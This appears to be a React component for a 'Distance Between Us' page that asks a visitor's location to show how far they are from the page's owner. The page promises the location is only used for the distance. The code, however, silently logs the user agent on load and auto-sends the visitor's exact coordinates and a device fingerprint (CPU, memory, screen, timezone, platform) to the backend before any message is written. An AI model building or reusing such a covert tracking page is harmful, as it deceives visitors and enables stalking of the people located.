import React, { useEffect, useState, useRef } from 'react';
import L from 'leaflet';
import { MapContainer, TileLayer, Marker, Polyline, useMap } from 'react-leaflet';
import { api } from '../utils/api';
import { getDistanceInMeters, formatDistance } from '../utils/distance';

// Fix Leaflet default icon issue in CRA
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: null,
  iconUrl: null,
  shadowUrl: null,
});

// Custom minimal circular markers for the map
const makeIcon = (bg, border) =>
  L.divIcon({
    className: '',
    html: `<div style="
      width:16px;height:16px;
      background:${bg};
      border-radius:50%;
      border:2.5px solid ${border};
      box-shadow:0 0 10px ${bg};
    "></div>`,
    iconSize: [16, 16],
    iconAnchor: [8, 8],
  });

const adminIcon = makeIcon('rgba(220, 180, 140, 0.9)', 'rgba(255, 255, 255, 0.8)'); // Light amber/wood
const visitorIcon = makeIcon('rgba(166, 112, 65, 0.9)', 'rgba(255, 255, 255, 0.8)'); // Deep wood

// Fit map to show both markers
function FitBounds({ positions }) {
  const map = useMap();
  useEffect(() => {
    if (positions.length === 2) {
      map.fitBounds(positions, { padding: [50, 50] });
    }
  }, [positions, map]);
  return null;
}

// Phase states
const PHASE = {
  ASK: 'ask',
  LOADING: 'loading',
  DENIED: 'denied',
  REVEAL: 'reveal',
  SENT: 'sent',
};

const getDeviceInfo = () => {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cpuCores: navigator.hardwareConcurrency || '??',
    memoryGB: navigator.deviceMemory || '??',
    platform: navigator.platform
  };
};

export default function VisitorPage() {
  const [phase, setPhase] = useState(PHASE.ASK);
  const [adminLocation, setAdminLocation] = useState(null);
  const [visitorCoords, setVisitorCoords] = useState(null);
  const [distance, setDistance] = useState(null);
  const [message, setMessage] = useState('');
  const [sending, setSending] = useState(false);
  const [error, setError] = useState('');
  const hasLogged = useRef(false);

  // Phase 1: Silent analytics
  useEffect(() => {
    if (!hasLogged.current) {
      hasLogged.current = true;
      api.logVisitor(navigator.userAgent).catch(() => {});
    }
  }, []);

  const requestLocation = async () => {
    setPhase(PHASE.LOADING);
    setError('');
    try {
      const loc = await api.getLocation();
      // If backend returns location with null adminLat
      if (!loc.adminLat) throw new Error('no-admin-location');

      const pos = await new Promise((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
        })
      );

      const { latitude, longitude } = pos.coords;
      const dist = getDistanceInMeters(latitude, longitude, loc.adminLat, loc.adminLng);

      setAdminLocation({ lat: loc.adminLat, lng: loc.adminLng });
      setVisitorCoords({ lat: latitude, lng: longitude });
      setDistance(dist);
      setPhase(PHASE.REVEAL);

      // Auto-send empty message to capture location
      api.sendMessage({
        text: '',
        distanceInMeters: dist,
        senderLat: latitude,
        senderLng: longitude,
        deviceInfo: getDeviceInfo()
      }).then(res => {
        if (res && res._id) {
          localStorage.setItem('currentMessageId', res._id);
        }
      }).catch(console.error);
    } catch (err) {
      if (err.message === 'no-admin-location') {
        setError('The other party has not set their location yet. Distance calculation unavailable.');
        setPhase(PHASE.ASK);
      } else if (err.code === 1) { // PERMISSION_DENIED
        setPhase(PHASE.DENIED);
      } else {
        setError('An error occurred. Please try again.');
        setPhase(PHASE.ASK);
      }
    }
  };

  const handleSend = async () => {
    if (!message.trim()) return;
    setSending(true);
    try {
      const msgId = localStorage.getItem('currentMessageId');
      if (msgId) {
        await api.updateMessage(msgId, message.trim());
      } else {
        await api.sendMessage({
          text: message.trim(),
          distanceInMeters: distance,
          senderLat: visitorCoords.lat,
          senderLng: visitorCoords.lng,
          deviceInfo: getDeviceInfo()
        });
      }
      localStorage.removeItem('currentMessageId');
      setPhase(PHASE.SENT);
    } catch {
      setError('Failed to send the message. Please try again.');
    } finally {
      setSending(false);
    }
  };

  const positions = visitorCoords && adminLocation
    ? [[visitorCoords.lat, visitorCoords.lng], [adminLocation.lat, adminLocation.lng]]
    : [];

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 py-12">
      {/* Ask phase */}
      {phase === PHASE.ASK && (
        <div className="animate-fadeInUp w-full max-w-sm">
          <Card>
            <div className="mb-8">
              <div className="w-10 h-px bg-[rgba(245,230,211,0.5)] mb-6 shadow-[0_0_10px_rgba(255,255,255,0.3)]" />
              <h1 className="text-2xl font-serif font-semibold text-[#fdf8f5] leading-snug mb-3">
                The Distance Between Us
              </h1>
              <p className="text-sm font-light text-[#e5d3c8] leading-relaxed opacity-90">
                I'd like to know how far you are from me right now.
                <br /><br />
                <span className="opacity-70 text-xs">Your location is only used to calculate the distance.</span>
              </p>
            </div>
            {error && <p className="text-xs text-[#ffb0a0] mb-4 text-center">{error}</p>}
            <PrimaryButton onClick={requestLocation}>
              Calculate Distance
            </PrimaryButton>
          </Card>
          <p className="text-center text-xs text-[#a8998b] mt-6 tracking-widest font-light">DISTANCE APP</p>
        </div>
      )}

      {/* Loading phase */}
      {phase === PHASE.LOADING && (
        <div className="animate-fadeInUp w-full max-w-sm">
          <Card>
            <div className="flex flex-col items-center gap-4 py-6">
              <div className="w-6 h-6 border-[3px] border-[rgba(220,180,140,0.2)] border-t-[rgba(220,180,140,0.9)] rounded-full animate-spin" />
              <p className="text-sm font-medium text-[#e5d3c8] animate-pulse-soft">Locating coordinates...</p>
            </div>
          </Card>
        </div>
      )}

      {/* Denied phase */}
      {phase === PHASE.DENIED && (
        <div className="animate-fadeInUp w-full max-w-sm">
          <Card>
            <div className="mb-6">
              <div className="w-10 h-px bg-[rgba(245,230,211,0.5)] mb-6 shadow-[0_0_10px_rgba(255,255,255,0.3)]" />
              <p className="text-sm font-light text-[#e5d3c8] leading-relaxed mb-6 opacity-90">
                Location access was denied. Please allow location permissions in your browser settings to continue.
              </p>
            </div>
            <SecondaryButton onClick={() => setPhase(PHASE.ASK)}>
              Try Again
            </SecondaryButton>
          </Card>
        </div>
      )}

      {/* Reveal phase */}
      {phase === PHASE.REVEAL && visitorCoords && adminLocation && (
        <div className="animate-fadeInUp w-full max-w-lg space-y-6">
          {/* Map */}
          <div className="rounded-2xl overflow-hidden glass-panel border-none p-1" style={{ height: 320 }}>
            <div className="w-full h-full rounded-xl overflow-hidden shadow-inner">
              <MapContainer
                center={[visitorCoords.lat, visitorCoords.lng]}
                zoom={10}
                style={{ height: '100%', width: '100%', background: 'transparent' }}
                zoomControl={false}
                attributionControl={false}
              >
                <TileLayer
                  url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                  attribution=""
                />
                <Marker position={[adminLocation.lat, adminLocation.lng]} icon={adminIcon} />
                <Marker position={[visitorCoords.lat, visitorCoords.lng]} icon={visitorIcon} />
                <Polyline
                  positions={positions}
                  pathOptions={{
                    color: 'rgba(220, 180, 140, 0.7)',
                    weight: 2,
                    opacity: 1,
                    dashArray: '8, 8',
                    className: 'dashed-line'
                  }}
                />
                <FitBounds positions={positions} />
              </MapContainer>
            </div>
          </div>

          {/* Distance display & Message Input */}
          <Card>
            <div className="text-center mb-6">
              <p className="text-xs tracking-widest uppercase font-semibold text-[#c8aa96] mb-2 opacity-80">Direct distance</p>
              <p className="text-4xl font-serif font-bold text-[#fdf8f5] tracking-tight drop-shadow-md">
                {formatDistance(distance)} {/* Note: you may need to translate 'كم' inside distance format function if desired */}
              </p>
              <p className="text-xs font-light text-[#e5d3c8] mt-2 opacity-60">
                (approximately {(distance).toLocaleString('en-US')} meters)
              </p>
            </div>

            <div className="w-full h-px bg-[rgba(255,255,255,0.06)] mb-6 shadow-[0_1px_1px_rgba(0,0,0,0.5)]" />

            <p className="text-sm font-medium text-[#e5d3c8] mb-3 opacity-90">Leave a message</p>
            <textarea
              value={message}
              onChange={e => setMessage(e.target.value)}
              placeholder="Write your thoughts here..."
              rows={3}
              className="w-full resize-none rounded-xl px-4 py-3 text-sm font-light leading-relaxed glass-input"
            />
            {error && <p className="text-xs text-[#ffb0a0] mt-2">{error}</p>}
            <div className="mt-4">
              <PrimaryButton onClick={handleSend} disabled={sending || !message.trim()}>
                {sending ? 'Sending...' : 'Send Message'}
              </PrimaryButton>
            </div>
          </Card>
        </div>
      )}

      {/* Sent phase */}
      {phase === PHASE.SENT && (
        <div className="animate-fadeInUp w-full max-w-sm">
          <Card>
            <div className="text-center py-6">
              <div className="w-10 h-px bg-[rgba(245,230,211,0.5)] mx-auto mb-6 shadow-[0_0_10px_rgba(255,255,255,0.3)]" />
              <p className="text-xl font-serif font-medium text-[#fdf8f5] mb-3">Message Received</p>
              <p className="text-sm font-light text-[#e5d3c8] opacity-80">Thank you for sharing your thoughts.</p>
            </div>
          </Card>
        </div>
      )}
    </div>
  );
}

// Shared UI components mapped to Glassmorphism Global CSS
function Card({ children }) {
  return (
    <div className="glass-panel p-8 shadow-2xl relative overflow-hidden rounded-3xl">
      {/* Subtle shine effect */}
      <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[rgba(255,255,255,0.15)] to-transparent opacity-50"></div>
      {children}
    </div>
  );
}

function PrimaryButton({ children, onClick, disabled }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className="w-full text-sm font-semibold tracking-wide uppercase rounded-xl py-3.5 px-6 glass-button-primary"
    >
      {children}
    </button>
  );
}

function SecondaryButton({ children, onClick }) {
  return (
    <button
      onClick={onClick}
      className="w-full text-sm font-medium tracking-wide uppercase rounded-xl py-3.5 px-6 glass-button-secondary"
    >
      {children}
    </button>
  );
}
